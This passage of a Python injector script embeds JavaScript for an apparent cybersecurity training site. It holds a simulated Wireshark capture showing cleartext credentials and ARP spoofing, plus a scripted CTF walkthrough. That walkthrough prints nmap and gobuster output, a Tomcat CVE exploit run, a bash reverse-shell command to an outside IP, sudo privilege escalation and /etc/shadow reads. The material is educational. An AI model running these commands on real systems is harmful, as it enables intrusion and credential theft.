    {t:'2.101000', src:'192.168.1.105', dst:'192.168.1.1',       proto:'HTTP','info':'GET /bank/transfer?to=attacker&amount=5000 HTTP/1.1'},
  ],
};

var cy5ProtoColors = {
  'DNS':'<span class="dim">DNS </span>',
  'TCP':'<span class="hi">TCP </span>',
  'TLS':'<span class="ok">TLS </span>',
  'ARP':'<span class="val">ARP </span>',
  'HTTP':'<span class="err">HTTP</span>',
  'DATA':'<span class="err">DATA</span>',
};

function cy5FormatPkt(pkt, num){
  var proto = cy5ProtoColors[pkt.proto] || ('<span class="dim">'+escHtml(pkt.proto)+'</span>');
  var info = pkt.info;
  if(pkt.proto === 'HTTP' && info.includes('CREDENTIALS')){
    info = '<span class="err">' + escHtml(info) + '</span>';
  } else if(pkt.proto === 'DATA'){
    info = '<span class="err">' + escHtml(info) + '</span>';
  } else if(info.includes('SPOOFED')){
    info = '<span class="err">' + escHtml(info) + '</span>';
  } else if(pkt.proto === 'TLS'){
    info = '<span class="ok">' + escHtml(info) + '</span>';
  } else {
    info = '<span class="dim">' + escHtml(info) + '</span>';
  }
  return '<span class="dim">' + String(num).padStart(4,' ') + '  ' + pkt.t + '  </span>' +
         '<span class="val">' + escHtml(String(pkt.src).padEnd(21,' ')) + '</span>' +
         '<span class="dim"> → </span>' +
         '<span class="val">' + escHtml(String(pkt.dst).padEnd(21,' ')) + '</span>' +
         '  ' + proto + '  ' + info;
}

function cy5Stop(){
  cy5Running = false;
  if(cy5Interval){ clearInterval(cy5Interval); cy5Interval = null; }
  var btn = document.getElementById('cy5btn');
  if(btn){ btn.textContent = 'Start Capture'; btn.onclick = cy5Start; }
  var out = document.getElementById('cy5out');
  if(out && cy5PacketNum > 0){
    out.innerHTML += '<br><span class="hi">Capture stopped. ' + cy5PacketNum + ' packets captured.</span>';
    out.scrollTop = out.scrollHeight;
  }
}

function cy5Start(){
  if(cy5Running){ cy5Stop(); return; }
  cy5Running = true;
  cy5PacketNum = 0;
  cy5AllPackets = [];

  var btn = document.getElementById('cy5btn');
  if(btn){ btn.textContent = 'Stop Capture'; btn.onclick = cy5Stop; }

  var out = document.getElementById('cy5out');
  if(out){
    out.innerHTML = '<span class="hi">Capturing on eth0... (Wireshark Simulator)</span><br>';
    out.innerHTML += '<span class="dim">No.   Time        Source                 Destination            Proto  Info</span><br>';
    out.innerHTML += '<span class="dim">─────────────────────────────────────────────────────────────────────────────</span><br>';
  }

  // stream normal scene packets with random timing
  var normalPkts = cy5Scenes.normal.slice();
  var idx = 0;
  cy5Interval = setInterval(function(){
    if(!cy5Running) return;
    cy5PacketNum++;
    var pkt = normalPkts[idx % normalPkts.length];
    // adjust time
    var fakePkt = Object.assign({}, pkt, {t: (cy5PacketNum * 0.118 + Math.random()*0.01).toFixed(6)});
    cy5AllPackets.push(fakePkt);
    if(out){
      out.innerHTML += cy5FormatPkt(fakePkt, cy5PacketNum) + '<br>';
      out.scrollTop = out.scrollHeight;
    }
    idx++;
  }, 600);
}

function cy5Scene(scene){
  cy5Stop();
  cy5AllPackets = [];
  cy5PacketNum = 0;
  var out = document.getElementById('cy5out');
  if(!out) return;

  var pkts = cy5Scenes[scene];
  if(!pkts){ out.innerHTML='<span class="err">Unknown scene.</span>'; return; }

  out.innerHTML = '<span class="hi">Loading scene: ' + escHtml(scene) + '</span><br>';
  out.innerHTML += '<span class="dim">No.   Time        Source                 Destination            Proto  Info</span><br>';
  out.innerHTML += '<span class="dim">─────────────────────────────────────────────────────────────────────────────</span><br>';

  pkts.forEach(function(pkt, i){
    cy5AllPackets.push(pkt);
    setTimeout(function(){
      cy5PacketNum++;
      if(out) out.innerHTML += cy5FormatPkt(pkt, cy5PacketNum) + '<br>';
      out.scrollTop = out.scrollHeight;
    }, i * 120);
  });

  // post-scene warnings
  setTimeout(function(){
    if(scene === 'http_login'){
      out.innerHTML += '<br><span class="err">⚠ WARNING: Credentials transmitted in CLEARTEXT over HTTP!</span><br>';
      out.innerHTML += '<span class="err">   username=admin  password=password — visible to any network observer</span><br>';
      out.innerHTML += '<span class="ok">   Fix: Use HTTPS (TLS) — credentials are encrypted</span><br>';
    } else if(scene === 'arp_spoof'){
      out.innerHTML += '<br><span class="err">⚠ ARP SPOOFING DETECTED!</span><br>';
      out.innerHTML += '<span class="err">   Two different MAC addresses claiming same IP 192.168.1.1</span><br>';
      out.innerHTML += '<span class="err">   Legitimate: c0:ff:ee:11:22:33  ←→  Attacker: DE:AD:BE:EF:CA:FE</span><br>';
      out.innerHTML += '<span class="warn">   All traffic is now being intercepted — classic MITM attack</span><br>';
      out.innerHTML += '<span class="ok">   Fix: Static ARP entries or Dynamic ARP Inspection (DAI) on managed switches</span><br>';
    }
    out.scrollTop = out.scrollHeight;
  }, pkts.length * 120 + 200);
}

function cy5Filter(){
  var fil = document.getElementById('cy5fil');
  var out = document.getElementById('cy5out');
  if(!fil || !out) return;
  var f = fil.value.trim().toLowerCase();

  if(!cy5AllPackets.length){
    out.innerHTML = '<span class="warn">No packets captured yet. Load a scene first.</span>';
    return;
  }

  var matched = cy5AllPackets.filter(function(pkt){
    if(!f) return true;
    if(f === 'http') return pkt.proto === 'HTTP' || pkt.proto === 'DATA';
    if(f === 'arp') return pkt.proto === 'ARP';
    if(f === 'dns') return pkt.proto === 'DNS';
    if(f === 'tcp') return pkt.proto === 'TCP';
    if(f === 'post') return pkt.info && pkt.info.startsWith('POST');
    if(f === 'tls') return pkt.proto === 'TLS';
    if(f.startsWith('ip.addr == ')){
      var ip = f.replace('ip.addr == ','').trim();
      return pkt.src.includes(ip) || pkt.dst.includes(ip);
    }
    return pkt.info.toLowerCase().includes(f) ||
           pkt.src.toLowerCase().includes(f) ||
           pkt.dst.toLowerCase().includes(f) ||
           pkt.proto.toLowerCase().includes(f);
  });

  out.innerHTML = '<span class="hi">Filter: ' + escHtml(f||'(none)') + '  →  ' + matched.length + ' / ' + cy5AllPackets.length + ' packets</span><br>';
  out.innerHTML += '<span class="dim">No.   Time        Source                 Destination            Proto  Info</span><br>';
  out.innerHTML += '<span class="dim">─────────────────────────────────────────────────────────────────────────────</span><br>';
  matched.forEach(function(pkt, i){
    out.innerHTML += cy5FormatPkt(pkt, i+1) + '<br>';
  });
  if(!matched.length) out.innerHTML += '<span class="warn">No packets match filter.</span><br>';
  out.scrollTop = out.scrollHeight;
}

/* ══════════════════════════════════════════════════════════════════════════
   LAB 06 — CTF Attack Chain
   ══════════════════════════════════════════════════════════════════════════ */
function cyLab6(){
  var sel = document.getElementById('cy6ph');
  var out = document.getElementById('cy6out');
  if(!sel || !out) return;
  var phase = sel.value;

  out.innerHTML = '<span class="dim">Initializing attack phase: ' + escHtml(phase) + '...</span>';

  var phases = {
    recon: [
      '<span class="hi">╔══ PHASE 1: RECONNAISSANCE ══╗</span>',
      '',
      '<span class="dim">$ nmap -sV -sC -T4 10.10.10.205</span>',
      '',
      '<span class="dim">PORT     STATE SERVICE  VERSION</span>',
      '<span class="ok">22/tcp   open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.7</span>',
      '<span class="ok">80/tcp   open  http     Apache httpd 2.4.29</span>',
      '<span class="ok">8080/tcp open  http     Apache Tomcat 9.0.27</span>',
      '<span class="ok">27017/tcp open  mongodb  MongoDB 4.2.1</span>',
      '',
      '<span class="warn">⚠ Tomcat 9.0.27 — CVE-2019-0232 RCE (CGI enabled)</span>',
      '<span class="err">⚠ MongoDB port EXPOSED — no auth configured?</span>',
      '',
      '<span class="val">$ curl -s http://10.10.10.205/ | grep -i "generator"</span>',
      '<span class="dim">&#x3C;meta name="generator" content="WordPress 5.2.3" /&#x3E;</span>',
      '',
      '<span class="hi">→ WordPress 5.2.3 + Tomcat 9.0.27 + MongoDB 4.2.1 — attack surface identified</span>',
    ],
    enum: [
      '<span class="hi">╔══ PHASE 2: ENUMERATION ══╗</span>',
      '',
      '<span class="dim">$ gobuster dir -u http://10.10.10.205 -w /usr/share/wordlists/dirb/common.txt</span>',
      '',
      '<span class="ok">/admin        (Status: 301) → /admin/</span>',
      '<span class="ok">/backup       (Status: 200) [Size: 4096]</span>',
      '<span class="ok">/config       (Status: 403) Forbidden</span>',
      '<span class="err">/config.php.bak (Status: 200) [Size: 512] ← BACKUP FILE EXPOSED</span>',
      '<span class="ok">/images       (Status: 301)</span>',
      '<span class="ok">/index.php    (Status: 200)</span>',
      '',
      '<span class="dim">$ curl -s http://10.10.10.205/config.php.bak</span>',
      '',
      '<span class="err">&#x3C;?php</span>',
      '<span class="err">$db_host = "localhost";</span>',
      '<span class="err">$db_user = "dbadmin";</span>',
      '<span class="err">$db_pass = "S3cr3tPassw0rd!";</span>',
      '<span class="err">$db_name = "webapp_db";</span>',
      '',
      '<span class="warn">⚠ Credentials leaked in backup file!</span>',
      '<span class="hi">→ Credentials captured: dbadmin / S3cr3tPassw0rd!</span>',
    ],
    exploit: [
      '<span class="hi">╔══ PHASE 3: EXPLOITATION ══╗</span>',
      '',
      '<span class="dim">$ searchsploit apache tomcat 9.0</span>',
      '',
      '<span class="val">Apache Tomcat - CGI Script Remote Code Execution (CVE-2019-0232)</span>',
      '<span class="dim">Path: exploits/windows/remote/47073.py</span>',
      '',
      '<span class="dim">$ python3 47073.py --target 10.10.10.205 --port 8080 --cmd "id"</span>',
      '',
      '<span class="ok">Sending malicious CGI request...</span>',
      '<span class="ok">Response received:</span>',
      '<span class="err">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>',
      '',
      '<span class="warn">⚠ RCE confirmed as www-data</span>',
      '',
      '<span class="dim">$ python3 47073.py --cmd "cat /var/www/html/wp-config.php | grep DB_"</span>',
      '',
      '<span class="err">define( \'DB_NAME\', \'wordpress\' );</span>',
      '<span class="err">define( \'DB_USER\', \'wpuser\' );</span>',
      '<span class="err">define( \'DB_PASSWORD\', \'S3cr3tPassw0rd!\' );</span>',
      '',
      '<span class="hi">→ Password reuse confirmed — same credential across services</span>',
    ],
    shell: [
      '<span class="hi">╔══ PHASE 4: SHELL ESTABLISHMENT ══╗</span>',
      '',
      '<span class="dim">$ nc -lvnp 4444  # attacker listener</span>',
      '<span class="dim">Listening on 0.0.0.0 4444</span>',
      '',
      '<span class="dim">$ python3 47073.py --cmd "bash -c \'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1\'"</span>',
      '',
      '<span class="ok">Connection received on 10.10.10.205 49312</span>',
      '',
      '<span class="err">bash: no job control in this shell</span>',
      '<span class="val">www-data@target:/var/www/html$</span> <span class="ok">whoami</span>',
      '<span class="ok">www-data</span>',
      '',
      '<span class="dim"># Upgrade to interactive shell</span>',
      '<span class="val">www-data@target$</span> python3 -c \'import pty; pty.spawn("/bin/bash")\'',
      '<span class="val">www-data@target$</span> export TERM=xterm',
      '',
      '<span class="hi">→ Stable reverse shell obtained as www-data</span>',
    ],
    privesc: [
      '<span class="hi">╔══ PHASE 5: PRIVILEGE ESCALATION ══╗</span>',
      '',
      '<span class="val">www-data@target$</span> sudo -l',
      '',
      '<span class="dim">Matching Defaults entries for www-data on target:</span>',
      '<span class="dim">    env_reset, mail_badpass</span>',
      '',
      '<span class="dim">User www-data may run the following commands on target:</span>',
      '<span class="err">    (ALL : ALL) NOPASSWD: /usr/bin/python3</span>',
      '',
      '<span class="warn">⚠ python3 with NOPASSWD sudo — instant root!</span>',
      '',
      '<span class="val">www-data@target$</span> sudo python3 -c \'import os; os.system("/bin/bash")',
      '',
      '<span class="err">root@target:/var/www/html#</span> <span class="ok">whoami</span>',
      '<span class="err">root</span>',
      '',
      '<span class="err">root@target:#</span> id',
      '<span class="err">uid=0(root) gid=0(root) groups=0(root)</span>',
      '',
      '<span class="hi">→ ROOT SHELL OBTAINED via sudo python3 GTFOBin</span>',
    ],
    loot: [
      '<span class="hi">╔══ PHASE 6: LOOT ══╗</span>',
      '',
      '<span class="err">root@target:#</span> hostname && whoami && id',
      '<span class="val">target</span>',
      '<span class="val">root</span>',
      '<span class="val">uid=0(root) gid=0(root)</span>',
      '',
      '<span class="err">root@target:#</span> cat /etc/shadow | head -5',
      '',
      '<span class="err">root:$6$saltsalt$hashhashhashhash...:19000:0:99999:7:::</span>',
      '<span class="err">www-data:$6$saltsalt$anotherhash...:19000:0:99999:7:::</span>',
      '<span class="dim">daemon:*:18375:0:99999:7:::</span>',
      '',
      '<span class="err">root@target:#</span> cat /root/flag.txt',
      '',
      '<span class="ok">╔══════════════════════════════════════════╗</span>',
      '<span class="ok">║  flag{r00t3d_v14_t0mc4t_rce_4nd_sud0}   ║</span>',
      '<span class="ok">╚══════════════════════════════════════════╝</span>',
      '',
      '<span class="err">root@target:#</span> ls /home',
      '<span class="val">charlie  wwwadmin</span>',
      '<span class="err">root@target:#</span> cat /home/charlie/user.txt',
      '<span class="ok">flag{u53r_fl4g_c0ngr4t5_0n_f00th0ld}</span>',
      '',
      '<span class="hi">═══ Attack Chain Complete ═══</span>',
      '<span class="dim">Recon → Enum → Exploit (CVE-2019-0232) → Shell → PrivEsc (sudo python3) → Root</span>',
    ],
  };

  setTimeout(function(){
    animLines('cy6out', phases[phase] || ['<span class="err">unknown phase</span>'], 70);
  }, 600);
}
/* ═══════════════════════════════════════════════════════════════════════════
   END CY-LAB-FNS
   ═══════════════════════════════════════════════════════════════════════════ */
</script>"""

# ──────────────────────────────────────────────────────────────────────────────
# INJECTION LOGIC
# ──────────────────────────────────────────────────────────────────────────────
def inject_file(path):
    with open(path, 'r', encoding='utf-8') as f:
        content = f.read()

    if MARKER in content:
        print(f"  SKIP  {os.path.basename(path)}  (already injected)")
        return False

    if '</body>' not in content:
        print(f"  WARN  {os.path.basename(path)}  (no </body> found — skipping)")
        return False

    # Insert just before the last </body>
    idx = content.rfind('</body>')
    new_content = content[:idx] + '\n' + JS_BLOCK + '\n' + content[idx:]

    with open(path, 'w', encoding='utf-8') as f:
        f.write(new_content)

    print(f"  OK    {os.path.basename(path)}  injected {len(JS_BLOCK)} chars")
    return True


def main():
    print("=" * 60)
    print("inject_lab_functions.py — CY-LAB-FNS injector")
    print("=" * 60)
    injected = 0
    for fname in LAB_FILES:
        path = os.path.join(LAB_DIR, fname)
        if not os.path.exists(path):
            print(f"  ERROR {fname}  (file not found)")
            continue
        if inject_file(path):
            injected += 1
    print("=" * 60)
    print(f"Done. {injected}/{len(LAB_FILES)} files injected.")
    print("=" * 60)


if __name__ == '__main__':
    main()
